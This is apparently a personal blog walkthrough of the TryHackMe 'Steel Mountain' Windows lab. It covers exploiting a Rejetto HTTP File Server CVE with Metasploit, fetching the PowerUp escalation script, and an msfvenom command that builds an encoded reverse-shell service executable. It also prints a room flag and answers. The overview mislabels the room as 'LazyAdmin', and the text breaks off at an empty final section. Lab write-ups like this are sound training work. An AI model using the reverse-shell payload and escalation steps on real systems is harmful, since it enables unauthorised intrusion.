---
title: "Steel Mountain - TryHackMe Walkthrough by Nisha"
layout: single
toc: true
toc_label: "Table of Contents"
toc_icon: "list-alt"
toc_sticky: true
classes: wide
author_profile: true
excerpt: "Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."
read_time: true
comments: no
share: true
related: true
description: "Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."
categories:
  - Blog
tags:
  - Cybersecurity
  - Windows
  - Penetration Testing
  - Ethical Hacking
  - TryHackMe
  - CTF
  - Privilege Escalation
tagline: "Steel Mountain - TryHackMe Walkthrough by Nisha"
header:
  teaser: /assets/images/thm/steelmountain/thm-steel-mountain-00.png
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/00-hero.jpg
categories: 
  - Blog
tags: 
  - TryHackMe
  - CTF
  - Privilege Escalation
  - Web Exploits
  - Reverse Shell
  - Enumeration
  - Cybersecurity
  - Linux Privilege Escalation
toc: true
toc_sticky: true
---

## Overview

This walkthrough demonstrates how I exploited the **LazyAdmin** room on [TryHackMe](https://tryhackme.com/room/steelmountain"). Each section includes detailed explanations of the enumeration, exploitation, and privilege escalation processes. 


## Task 1 - Introduction

Deploy the machine.

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-1.png">

Q: Who is the employee of the month?

A: Bill Harper


<img src="/assets/images/thm/steelmountain/thm-steel-mountain-2.png">

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-3.png">

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-4.png">


## Task 2 - Initial Access

<strong>Q: Scan the machine with nmap. What is the other port running a web server on? </strong> <br>

<em> A: 8080 </em>

<strong>Q: Take a look at the other web server. What file server is running?</strong> <br>
<img src="/assets/images/thm/steelmountain/thm-steel-mountain-6.png">

<em>A: Rejetto HTTP File Server</em>


<strong>Q: What is the CVE number to exploit this file server?</strong> <br>

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-5.png">

<em>A: 2014-6287</em>

<strong>Q: Use Metasploit to get an initial shell. What is the user flag?</strong> <br>

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-7.png">

<img src="/assets/images/thm/steelmountain/steelmountain/thm-steel-mountain-8.png">
<img src="/assets/images/thm/steelmountain/thm-steel-mountain-9.png">
<img src="/assets/images/thm/steelmountain/thm-steel-mountain-10.png">

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-11.png">
<img src="/assets/images/thm/steelmountain/thm-steel-mountain-12.png">

<em>A: b04763b6fcf51fcd7c13abc7db4fd365</em>


## Task 3 - Privilege Escalation

We have an initial shell on this machine as user Bill.  Now, we will further enumerate the machine and escalate our privileges to root to obtain the final flag!

We can use the PowerUp PowerShell script to esclate our privileges.

Download the script using the following command:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```
<img src="/assets/images/thm/steelmountain/thm-steel-mountain-13.png">


We will use the upload command in Metasploit to upload the script. 

To execute this using Meterpreter, we will type load powershell into meterpreter. Then we will enter powershell by entering powershell_shell:

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-14.png">


Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-15.png">

- AdvancedSystemCareService9

Use msfvenom to generate a reverse shell as an Windows executable.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

<img src="/assets/images/thm/steelmountain/thm-steel-mountain-14.png">

## Task 4 - Access and Escalation Without Metasploit 

